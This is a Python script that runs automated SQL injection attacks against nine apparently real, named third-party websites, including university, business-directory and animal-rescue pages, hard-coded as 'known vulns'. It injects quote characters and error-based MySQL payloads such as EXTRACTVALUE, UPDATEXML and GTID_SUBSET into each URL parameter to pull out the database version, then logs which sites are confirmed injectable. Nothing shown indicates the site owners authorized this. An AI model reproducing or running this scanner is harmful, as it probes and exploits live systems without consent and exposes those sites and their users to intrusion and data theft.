import asyncio
import aiohttp
import time
import logging

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("SQLiTest")

KNOWN_VULNS = [
    "https://barodabusinessdirectory.com/individualprofile.php?Login_Id=433",
    "https://mindloops.org/mind-booster-content.php?id=110&type=qz",
    "https://native.edu.pk/detail.php?ComCatID=11",
    "https://www.zamalekrealestate.com/mobile/property/show.php?ID=1343",
    "http://www.elahi-grp.com/content.php?Id=62",
    "https://www.myfuturejob.ph/page.php?id=20",
    "https://www.hpuniv.ac.in/university-detail/vc-message-detail.php?icdeol&messid=204",
    "https://www.axarquiaanimalrescue.com/show.php?id=1207",
    "https://www.thyroid.com.tw/main.php?po=new&op=content&PP[id]=126",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "mysql_fetch_array()", "mysql_fetch_assoc()",
    "mysql_num_rows()", "mysql_connect()",
    "supplied argument is not a valid mysql",
    "warning: mysql_", "valid mysql result",
    "unclosed quotation mark after the character string",
    "microsoft ole db provider for sql server",
    "system.data.sqlclient.sqlexception",
    "ora-00933", "ora-01756",
    "pg_query(): query failed",
    "warning: pg_",
    "sqlite_error",
    "dynamic sql error",
    "syntax error in sql statement",
    "driver [pdo_mysql]",
    "sqlstate[",
    "duplicate entry",
    "subquery returns more than 1 row",
    "incorrect parameter count",
    "operand should contain 1 column",
    "xpath syntax error",
    "illegal mix of collations",
    "unknown column",
    "table.*doesn't exist",
    "malformed",
]

ERROR_PAYLOADS = [
    "'",
    "\"",
    "')",
    "\\",
    "1'",
]

CONFIRM_PAYLOADS = [
    " AND 1=1--",
    " AND 1=2--",
    " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    " AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
    " AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)--",
    " OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
    "' OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
]

TIMEOUT = aiohttp.ClientTimeout(total=12)

async def fetch(session, url):
    try:
        async with session.get(url, timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
            body = await r.text(errors='ignore')
            return r.status, body, len(body)
    except:
        return 0, "", 0

def find_errors(body):
    body_l = body.lower()
    return [e for e in SQL_ERRORS if e in body_l]

async def test_url(session, url):
    logger.info("Testing: %s", url)

    base = url.split("?")[0]
    params = url.split("?")[1].split("&")

    bs_status, bs_body, bs_len = await fetch(session, url)
    if bs_status <= 0:
        logger.info("  SKIP: can't reach")
        return False

    bs_errors = set(find_errors(bs_body))
    logger.info("  Baseline: status=%d len=%d existing_errors=%d", bs_status, bs_len, len(bs_errors))

    for i in range(len(params)):
        pname = params[i].split("=")[0] if "=" in params[i] else params[i]

        for payload in ERROR_PAYLOADS:
            new_params = list(params)
            new_params[i] += payload
            test = f"{base}?{'&'.join(new_params)}"
            status, body, blen = await fetch(session, test)
            if status <= 0:
                continue
            new_errs = set(find_errors(body)) - bs_errors
            if new_errs:
                logger.info("  HIT (error): param=%s payload=%s new_errors=%s", pname, repr(payload), new_errs)

                for cp in CONFIRM_PAYLOADS:
                    new_params2 = list(params)
                    new_params2[i] += cp
                    test2 = f"{base}?{'&'.join(new_params2)}"
                    s2, b2, l2 = await fetch(session, test2)
                    if s2 <= 0:
                        continue
                    new_errs2 = set(find_errors(b2)) - bs_errors
                    if new_errs2:
                        logger.info("  CONFIRMED: param=%s confirm_payload=%s errors=%s", pname, cp[:50], new_errs2)
                        return True

                logger.info("  DETECTED (1 hit, no confirm): param=%s", pname)
                return True

        for payload in CONFIRM_PAYLOADS:
            new_params = list(params)
            new_params[i] += payload
            test = f"{base}?{'&'.join(new_params)}"
            status, body, blen = await fetch(session, test)
            if status <= 0:
                continue
            new_errs = set(find_errors(body)) - bs_errors
            ldiff = abs(blen - bs_len)
            if new_errs:
                logger.info("  HIT (confirm payload): param=%s payload=%s errors=%s", pname, payload[:50], new_errs)
                return True
            if "~" in body and ldiff > 100:
                logger.info("  HIT (data extraction): param=%s payload=%s len_diff=%d", pname, payload[:50], ldiff)
                return True

    return False

async def main():
    logger.info("=" * 50)
    logger.info("SQL INJECTION TEST — %d known vulns", len(KNOWN_VULNS))
    logger.info("=" * 50)

    detected = 0
    missed = 0

    async with aiohttp.ClientSession() as session:
        for url in KNOWN_VULNS:
            logger.info("")
            found = await test_url(session, url)
            if found:
                detected += 1
                logger.info("  ✅ DETECTED")
            else:
                missed += 1
                logger.info("  ❌ MISSED")

    logger.info("")
    logger.info("=" * 50)
    logger.info("RESULTS: %d/%d detected, %d missed", detected, len(KNOWN_VULNS), missed)
    logger.info("Detection rate: %d%%", int(100 * detected / len(KNOWN_VULNS)))
    logger.info("=" * 50)

if __name__ == "__main__":
    asyncio.run(main())
